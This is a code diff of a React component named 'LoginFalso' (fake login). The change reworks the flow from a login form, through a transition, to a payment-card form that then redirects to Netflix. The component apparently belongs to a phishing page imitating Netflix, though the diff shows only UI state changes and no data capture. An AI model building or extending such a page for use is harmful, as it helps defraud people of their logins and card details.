@@ -7,7 +7,8 @@ import styles from './Iniciar.module.css';
 
 export default function LoginFalso() {
   const [isLoginForm, setIsLoginForm] = useState(true); // Estado para alternar formularios
-  const [loading, setLoading] = useState(false); // Estado para controlar si se está cargando
+  const [showTransition, setShowTransition] = useState(false); // Estado para mostrar la transición
+  const [showTarjeta, setShowTarjeta] = useState(false); // Estado para mostrar la tarjeta después de la transición
 
   const onPaymentSuccess = () => {
     // Redirigir a la página de Netflix
@@ -16,26 +17,29 @@ export default function LoginFalso() {
 
   // Función que cambia el estado a mostrar la tarjeta después del login exitoso
   const handleLoginSuccess = () => {
-    setLoading(true); // Comienza a mostrar la imagen de carga
+    setShowTransition(true); // Comienza la transición
 
-    // Simular un retraso para la imagen de carga (simulando el proceso de login)
+    // Simular un retraso para la transición
     setTimeout(() => {
-      setLoading(false); // Después del retraso, ocultar la imagen de carga y mostrar la tarjeta
-      setIsLoginForm(false); // Cambiar a mostrar la Tarjeta
-    }, 2000); // Ajusta el tiempo según sea necesario
+      setShowTransition(false); // Finaliza la transición
+      setShowTarjeta(true); // Muestra el formulario de tarjeta después de la transición
+    }, 1000); // Duración de la transición, puedes ajustarlo como desees
   };
 
   return (
     <div className={styles.loginfalso}>
-      <Transicion isLoginForm={isLoginForm} />
-      
-      {/* Mostrar la imagen de carga si el estado loading es true */}
-      {loading ? (
-        <div className={styles.loadingContainer}>
-          <img src="/loading.gif" alt="Cargando..." className={styles.loadingImage} />
-        </div>
+      {/* Mostrar la transición solo si showTransition es true */}
+      {showTransition ? (
+        <Transicion />
       ) : (
-        isLoginForm ? <Login onLoginSuccess={handleLoginSuccess} /> : <TarjetaPago onPaymentSuccess={onPaymentSuccess} />
+        <>
+          {/* Mostrar la tarjeta después de la transición */}
+          {showTarjeta ? (
+            <TarjetaPago onPaymentSuccess={onPaymentSuccess} />
+          ) : (
+            isLoginForm && <Login onLoginSuccess={handleLoginSuccess} />
+          )}
+        </>
       )}
     </div>
   );
